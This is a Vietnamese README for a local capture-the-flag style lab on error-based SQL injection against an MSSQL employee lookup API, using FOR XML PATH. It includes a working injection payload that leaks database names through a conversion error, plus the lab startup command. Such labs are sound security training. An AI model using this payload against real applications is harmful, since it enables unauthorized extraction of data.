# SQLi-013: MSSQL XML PATH Error-based

## 🎯 Mục Tiêu
Sử dụng **FOR XML PATH** để extract multiple rows trong một error message.

## 📝 Kịch Bản
Employee lookup API với MSSQL.

**URL:** `http://localhost:5013/api/employee?id=1`

## 🎓 Kiến Thức
```sql
' AND 1=CAST((SELECT name+',' FROM master..sysdatabases FOR XML PATH('')) AS int)--
```
Error chứa list các database names.

## 🚀 Chạy Lab
```bash
docker-compose up -d
# http://localhost:5013
```

## 🏁 Flag
Extract từ bảng `flags`.
